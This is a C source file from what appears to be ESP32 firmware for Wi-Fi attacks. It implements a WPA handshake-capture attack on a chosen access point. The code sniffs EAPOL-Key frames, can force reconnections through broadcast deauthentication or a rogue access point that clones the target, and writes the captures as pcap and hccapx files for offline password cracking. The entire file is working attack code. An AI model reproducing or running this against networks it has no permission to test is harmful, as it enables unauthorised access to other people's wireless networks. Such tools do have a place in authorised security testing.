/**
 * @file attack_handshake.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 *
 * @brief Implements handshake attacks and different available methods.
 */

#include "attack_handshake.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "attack.h"
#include "attack_method.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_wifi_types.h"
#include "frame_analyzer.h"
#include "hccapx_serializer.h"
#include "pcap_serializer.h"
#include "wifi_controller.h"

namespace {
const char *TAG = "main:attack_handshake";
attack_handshake_methods_t method = attack_handshake_methods_t::ATTACK_HANDSHAKE_METHOD_PASSIVE;
ap_records_t gApRecords = {0, NULL};
}  // namespace

/**
 * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
 *
 * If EAPOL-Key frame is captured and DATA_FRAME_EVENT_EAPOLKEY_FRAME event is received from event pool, this method
 * appends the frame to status content and serialize them into pcap and hccapx format.
 *
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_EAPOLKEY_FRAME
 * @param event_data expects wifi_promiscuous_pkt_t
 */
static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
  ESP_LOGI(TAG, "Got EAPoL-Key frame");
  ESP_LOGD(TAG, "Processing handshake frame...");
  wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)event_data;
  attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
  pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
  hccapx_serializer_add_frame((data_frame_t *)frame->payload);
}

void attack_handshake_start(const attack_config_t *attack_config) {
  ESP_LOGI(TAG, "Starting handshake attack...");
  method = (attack_handshake_methods_t)attack_config->method;
  gApRecords = attack_config->ap_records;  // Take ownership
  const wifi_ap_record_t *ap_record = gApRecords.records[0];
  pcap_serializer_init();
  hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
  wifictl_sniffer_filter_frame_types(true, false, false);
  wifictl_sniffer_start(ap_record->primary);
  frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
  ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME,
                                             &eapolkey_frame_handler, NULL));
  switch (method) {
    case ATTACK_HANDSHAKE_METHOD_BROADCAST:
      ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
      attack_method_broadcast(&gApRecords, 5);
      break;
    case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
      ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
      attack_method_rogueap(&gApRecords, 0);
      break;
    case ATTACK_HANDSHAKE_METHOD_PASSIVE:
      ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
      // No actions required. Passive handshake capture
      break;
    default:
      ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
  }
}

void attack_handshake_stop() {
  switch (method) {
    case ATTACK_HANDSHAKE_METHOD_BROADCAST:
      attack_method_broadcast_stop();
      break;
    case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
      wifictl_mgmt_ap_start();
      wifictl_restore_ap_mac();
      break;
    case ATTACK_HANDSHAKE_METHOD_PASSIVE:
      // No actions required.
      break;
    default:
      ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
  }
  wifictl_sniffer_stop();
  frame_analyzer_capture_stop();
  ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &eapolkey_frame_handler));

  method = attack_handshake_methods_t::ATTACK_HANDSHAKE_METHOD_PASSIVE;
  gApRecords.len = 0;
  free(gApRecords.records);
  gApRecords.records = NULL;

  ESP_LOGD(TAG, "Handshake attack stopped");
}